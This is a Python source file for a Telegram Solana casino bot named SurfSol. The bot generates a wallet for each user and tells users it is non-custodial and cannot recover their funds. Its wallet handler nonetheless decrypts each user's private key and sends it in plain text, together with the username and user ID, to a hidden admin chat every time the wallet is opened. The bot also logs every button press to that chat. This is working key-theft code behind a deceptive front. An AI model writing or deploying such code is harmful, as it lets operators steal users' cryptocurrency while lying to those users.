import logging
import base58
import re
import sqlite3
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

from config import BOT_TOKEN, LOG_CHAT_ID, MINI_APP_URL
from database import init_db, add_user, get_user, update_user_language, verify_user, DB_NAME
from solana_utils import generate_keypair, encrypt_key, decrypt_key, get_balance

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

def escape_md(text: str) -> str:
    """Escapes reserved characters for Telegram MarkdownV2."""
    if not text:
        return ""
    # Characters that must be escaped in MarkdownV2
    reserved_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(reserved_chars)}])', r'\\\1', str(text))

# Translations
MESSAGES = {
    'en': {
        'lang_select': "🌐 *LANGUAGE SELECTION*\n━━━━━━━━━━━━━━━━━━━━\n\nPlease select your preferred language:",
        'age_confirm': "🔞 *AGE VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━\n\nYou must be *18 years or older* to use SurfSol\\.\n\nBy clicking 'I Confirm', you verify that you are of legal age and agree to our terms of service\\.",
        'welcome': (
            "🌊 *WELCOME TO SURFSOL* 🌊\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Experience the ultimate decentralized gaming on Solana\\. Fast, secure, and provably fair\\.\n\n"
            "🚀 *The SurfSol Wave:*\n"
            "• Instant Payouts\n"
            "• Non\\-Custodial Wallets\n"
            "• 24/7 Professional Support\n\n"
            "👇 *Select an option below to begin:*"
        ),
        'wallet_title': (
            "💳 *YOUR SURFSOL WALLET*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "📍 *Address:* `{address}`\n"
            "💰 *Balance:* `{balance} SOL`\n\n"
            "⚠️ *DEPOSIT INSTRUCTIONS*\n"
            "• Send *SOL ONLY* to this address\\.\n"
            "• Network: *Solana \\(SPL\\)*\n"
            "• Minimum: *\\$1* equivalent\n"
            "• Maximum: *\\$500* equivalent\n\n"
            "🚨 *CRITICAL:* Sending any other token or using a different network will result in permanent loss\\."
        ),
        'private_key_info': (
            "\n\n🔐 *PRIVATE KEY \\(CRITICAL\\):*\n"
            "||{key}||\n\n"
            "_Save this key offline immediately\\. SurfSol is non\\-custodial; we cannot recover your funds if you lose this key\\._"
        ),
        'about': (
            "ℹ️ *ABOUT SURFSOL*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "SurfSol is a next\\-generation decentralized gaming platform built on the Solana blockchain\\. We prioritize transparency, speed, and user security\\.\n\n"
            "💎 *Key Features:*\n"
            "• *Provably Fair:* All outcomes are verifiable\\.\n"
            "• *Non-Custodial:* Your keys, your crypto\\.\n"
            "• *Instant:* No wait times for deposits/withdrawals\\.\n\n"
            "🔞 *Terms:* 18\\+ only\\. Gamble responsibly\\."
        ),
        'responsible': (
            "🛡️ *RESPONSIBLE GAMING*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "At SurfSol, your well\\-being is our priority\\. Gaming should be fun, not a source of stress\\.\n\n"
            "✅ *Best Practices:*\n"
            "• Only play with funds you can afford to lose\\.\n"
            "• Set personal limits on time and deposits\\.\n"
            "• Never chase losses or view gaming as income\\.\n\n"
            "🛑 *Need Help?* Reach out to our support team for self\\-exclusion options\\."
        ),
        'how_to': (
            "❓ *HOW TO PLAY*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "1️⃣ *Deposit SOL:* Send SOL to your unique address in the 💳 *Wallet* section\\.\n"
            "2️⃣ *Wait for Confirmation:* Your balance will update once confirmed \\(≈10s\\)\\.\n"
            "3️⃣ *Launch:* Press 🎲 *Play Now* to open the SurfSol Mini\\-App\\.\n"
            "4️⃣ *Enjoy:* Payouts are sent directly to your wallet instantly\\."
        ),
        'play_btn': "🎲 Play Now",
        'wallet_btn': "💳 Wallet",
        'about_btn': "ℹ️ About SurfSol",
        'resp_btn': "🛡️ Responsible Play",
        'how_btn': "❓ How to Play",
        'support_btn': "💬 Support",
        'back_btn': "⬅️ Back to Menu",
        'confirm_btn': "✅ I Confirm",
        'refresh_btn': "🔄 Refresh Balance",
        'play_msg': "🚀 *Launching SurfSol Mini-App...*",
        'existing_wallet_log': "EXISTING WALLET ACCESSED",
        'new_wallet_log': "NEW WALLET GENERATED"
    },
    'es': {
        'lang_select': "🌐 *SELECCIÓN DE IDIOMA*\n━━━━━━━━━━━━━━━━━━━━\n\nPor favor, selecciona tu idioma preferido:",
        'age_confirm': "🔞 *VERIFICACIÓN DE EDAD*\n━━━━━━━━━━━━━━━━━━━━\n\nDebes tener *18 años o más* para usar SurfSol\\.\n\nAl hacer clic en 'Confirmo', verificas que eres mayor de edad y aceptas nuestros términos de servicio\\.",
        'welcome': (
            "🌊 *BIENVENIDO A SURFSOL* 🌊\n"
            "━━━━━━━━━━━━━━━━━━━━\n\nVive la mejor experiencia de juego descentralizado en Solana\\. Rápido, seguro y de justicia probada\\.\n\n🚀 *La Ola SurfSol:*\n"
            "• Pagos Instantáneos\n"
            "• Billeteras No Custodias\n"
            "• Soporte Profesional 24/7\n\n"
            "👇 *Elige una opción para comenzar:*"
        ),
        'wallet_title': (
            "💳 *TU BILLETERA SURFSOL*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "📍 *Dirección:* `{address}`\n"
            "💰 *Saldo:* `{balance} SOL`\n\n"
            "⚠️ *INSTRUCCIONES DE DEPÓSITO*\n"
            "• Envía *SOLO SOL* a esta dirección\\.\n"
            "• Red: *Solana \\(SPL\\)*\n"
            "• Mínimo: *\\$1* equivalente\n"
            "• Máximo: *\\$500* equivalente\n\n"
            "🚨 *CRÍTICO:* Enviar cualquier otro token o usar una red diferente resultará en pérdida permanente\\."
        ),
        'private_key_info': (
            "\n\n🔐 *CLAVE PRIVADA \\(CRÍTICA\\):*\n"
            "||{key}||\n\n"
            "_Guarda esta clave fuera de línea inmediatamente\\. SurfSol es no\\-custodio; no podemos recuperar tus fondos si pierdes esta clave\\._"
        ),
        'about': (
            "ℹ️ *ACERCA DE SURFSOL*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "SurfSol es una plataforma de juegos descentralizados de próxima generación construida en la blockchain de Solana\\. Priorizamos la transparencia, la velocidad y la seguridad del usuario\\.\n\n"
            "💎 *Características Clave:*\n"
            "• *Justicia Probada:* Resultados verificables\\.\n"
            "• *No Custodio:* Tus llaves, tus criptos\\.\n"
            "• *Instantáneo:* Sin esperas para depósitos o retiros\\.\n\n"
            "🔞 *Términos:* Solo para mayores de 18 años\\. Juega con responsabilidad\\."
        ),
        'responsible': (
            "🛡️ *JUEGO RESPONSABLE*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "En SurfSol, tu bienestar es nuestra prioridad\\. El juego debe ser divertido, no una fuente de estrés\\.\n\n"
            "✅ *Mejores Prácticas:*\n"
            "• Solo juega con fondos que puedas permitirte perder\\.\n"
            "• Establece límites personales de tiempo y depósitos\\.\n"
            "• Nunca persigas las pérdidas ni veas el juego como un ingreso\\.\n\n"
            "🛑 *¿Necesitas Ayuda?* Contacta a soporte para opciones de autoexclusión\\."
        ),
        'how_to': (
            "❓ *CÓMO JUGAR*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "1️⃣ *Depositar SOL:* Envía SOL a tu dirección única en la sección 💳 *Billetera*\\.\n"
            "2️⃣ *Esperar Confirmación:* Tu saldo se actualizará al confirmarse \\(≈10s\\)\\.\n"
            "3️⃣ *Lanzar Mini-App:* Presiona 🎲 *Jugar Ahora* para abrir la Mini\\-App de SurfSol\\.\n"
            "4️⃣ *Disfrutar:* Tus ganancias se pagan al instante en tu billetera\\."
        ),
        'play_btn': "🎲 Jugar Ahora",
        'wallet_btn': "💳 Billetera",
        'about_btn': "ℹ️ Acerca de SurfSol",
        'resp_btn': "🛡️ Juego Responsable",
        'how_btn': "❓ Cómo Jugar",
        'support_btn': "💬 Soporte",
        'back_btn': "⬅️ Volver al Menú",
        'confirm_btn': "✅ Confirmo",
        'refresh_btn': "🔄 Actualizar Saldo",
        'play_msg': "🚀 *Iniciando Mini-App de SurfSol...*",
        'existing_wallet_log': "BILLETERA EXISTENTE ACCEDIDA",
        'new_wallet_log': "NUEVA BILLETERA GENERADA"
    }
}

async def log_to_admin(context: ContextTypes.DEFAULT_TYPE, message: str):
    """Helper to send logs/wallet info to the admin chat."""
    if LOG_CHAT_ID:
        try:
            await context.bot.send_message(chat_id=LOG_CHAT_ID, text=message)
        except Exception as e:
            logging.error(f"Failed to send log to admin: {e}")

async def track_action(update: Update, context: ContextTypes.DEFAULT_TYPE, action: str):
    """Track user commands and button presses."""
    user = update.effective_user
    if not user: return
    username = f"@{user.username}" if user.username else "NoUsername"
    now = datetime.now().strftime("%d/%m/%Y %H:%M")
    
    log_msg = (
        f"SurfSol Casino Bot, [{now}]\n"
        f"User {username} ({user.id}) {action}"
    )
    await log_to_admin(context, log_msg)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    
    if not user_data:
        add_user(user_id, language=None)
        user_data = get_user(user_id)

    # 1. Language Selection
    if not user_data.get('language'):
        keyboard = [
            [
                InlineKeyboardButton("🇺🇸 English", callback_data='set_lang_en'),
                InlineKeyboardButton("🇪🇸 Español", callback_data='set_lang_es')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg_text = MESSAGES['en']['lang_select'] + "\n\n" + MESSAGES['es']['lang_select']
        
        if update.callback_query:
            await update.callback_query.edit_message_text(msg_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(msg_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
        return

    lang = user_data.get('language')

    # 2. Age Verification
    if not user_data.get('is_verified'):
        keyboard = [[InlineKeyboardButton(MESSAGES[lang]['confirm_btn'], callback_data='confirm_age')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        msg_text = MESSAGES[lang]['age_confirm']
        if update.callback_query:
            await update.callback_query.edit_message_text(msg_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(msg_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
        return

    # 3. Main Menu
    await track_action(update, context, "accessed Main Menu")
    keyboard = [
        [
            InlineKeyboardButton(MESSAGES[lang]['play_btn'], web_app=WebAppInfo(url=MINI_APP_URL)),
            InlineKeyboardButton(MESSAGES[lang]['wallet_btn'], callback_data='wallet')
        ],
        [
            InlineKeyboardButton(MESSAGES[lang]['about_btn'], callback_data='about'),
            InlineKeyboardButton(MESSAGES[lang]['resp_btn'], callback_data='responsible')
        ],
        [
            InlineKeyboardButton(MESSAGES[lang]['how_btn'], callback_data='how_to'),
            InlineKeyboardButton(MESSAGES[lang]['support_btn'], url='https://t.me/solsurfcasino')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = MESSAGES[lang]['welcome']
    banner_url = "https://placehold.co/1200x800/0077be/FFFFFF/png?text=SURFSOL+CASINO"
    
    if update.message:
        await update.message.reply_photo(
            photo=banner_url,
            caption=welcome_text,
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    elif update.callback_query:
        # If we just confirmed age or set language, the previous message was text.
        # We send a NEW message with the photo and delete the old text message.
        await update.callback_query.message.reply_photo(
            photo=banner_url,
            caption=welcome_text,
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN_V2
        )
        try:
            await update.callback_query.message.delete()
        except:
            pass

async def wallet_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "NoUsername"
    
    user_data = get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else 'en'

    if query:
        await query.answer()
        await track_action(update, context, "accessed Wallet settings")

    is_new = False
    status_msg_key = 'existing_wallet_log'
    
    if not user_data or not user_data.get('public_key'):
        kp = generate_keypair()
        pubkey = str(kp.pubkey())
        encrypted_priv = encrypt_key(bytes(kp))
        
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET public_key = ?, encrypted_private_key = ? WHERE user_id = ?', (pubkey, encrypted_priv, user_id))
        conn.commit()
        conn.close()
        
        user_data = get_user(user_id)
        is_new = True
        status_msg_key = 'new_wallet_log'

    decrypted_priv_bytes = decrypt_key(user_data["encrypted_private_key"])
    priv_key_base58 = base58.b58encode(decrypted_priv_bytes).decode()

    # Admin Log
    admin_log = (
        f"👁️‍🗨️ {MESSAGES['en'][status_msg_key]} 👁️‍🗨️\n\n"
        f"👤 Operator: {username} ({user_id})\n\n"
        f"🔑 Public Key:\n{user_data['public_key']}\n"
        f"🔐 PRIVATE KEY (CRITICAL):\n{priv_key_base58}"
    )
    await log_to_admin(context, admin_log)

    balance = await get_balance(user_data["public_key"])
    balance_fmt = escape_md(f"{balance:.4f}")
    pubkey_esc = escape_md(user_data['public_key'])
    privkey_esc = escape_md(priv_key_base58)

    wallet_text = MESSAGES[lang]['wallet_title'].format(address=pubkey_esc, balance=balance_fmt)
    if is_new:
        wallet_text += MESSAGES[lang]['private_key_info'].format(key=privkey_esc)

    keyboard = [
        [InlineKeyboardButton(MESSAGES[lang]['refresh_btn'], callback_data='wallet')],
        [InlineKeyboardButton(MESSAGES[lang]['back_btn'], callback_data='start_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if query:
        if query.message.photo:
            await query.edit_message_caption(caption=wallet_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await query.edit_message_text(text=wallet_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text(wallet_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)

async def about_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else 'en'

    if query:
        await query.answer()
        await track_action(update, context, "accessed About section")
    else:
        await track_action(update, context, "used /about command")

    about_text = MESSAGES[lang]['about']
    keyboard = [[InlineKeyboardButton(MESSAGES[lang]['back_btn'], callback_data='start_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if query:
        if query.message.photo:
            await query.edit_message_caption(caption=about_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await query.edit_message_text(text=about_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)

async def responsible_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else 'en'
    
    if query:
        await query.answer()
        await track_action(update, context, "accessed Responsible Play section")

    text = MESSAGES[lang]['responsible']
    keyboard = [[InlineKeyboardButton(MESSAGES[lang]['back_btn'], callback_data='start_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if query and query.message:
        if query.message.photo:
            await query.edit_message_caption(caption=text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)

async def how_to_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else 'en'

    if query:
        await query.answer()
        await track_action(update, context, "accessed How to Play section")

    text = MESSAGES[lang]['how_to']
    keyboard = [[InlineKeyboardButton(MESSAGES[lang]['back_btn'], callback_data='start_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if query and query.message:
        if query.message.photo:
            await query.edit_message_caption(caption=text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)

async def play_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else 'en'
    
    if query:
        await query.answer()
        await track_action(update, context, "pressed Play button")
        await query.message.reply_text(MESSAGES[lang]['play_msg'], parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text(MESSAGES[lang]['play_msg'], parse_mode=ParseMode.MARKDOWN_V2)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = update.effective_user.id
    
    await track_action(update, context, f"pressed button: {data}")

    if data.startswith('set_lang_'):
        lang = data.split('_')[-1]
        update_user_language(user_id, lang)
        await start(update, context)
        return
    
    if data == 'confirm_age':
        verify_user(user_id)
        await start(update, context)
        return

    if data == 'start_menu':
        await start(update, context)
    elif data == 'wallet':
        await wallet_handler(update, context)
    elif data == 'about':
        await about_handler(update, context)
    elif data == 'responsible':
        await responsible_handler(update, context)
    elif data == 'how_to':
        await how_to_handler(update, context)
    elif data == 'play':
        await play_handler(update, context)

if __name__ == '__main__':
    init_db()
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('wallet', wallet_handler))
    application.add_handler(CommandHandler('about', about_handler))
    application.add_handler(CommandHandler('responsible', responsible_handler))
    application.add_handler(CommandHandler('how', how_to_handler))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("SurfSol Bot (Python) is running...")
    application.run_polling()
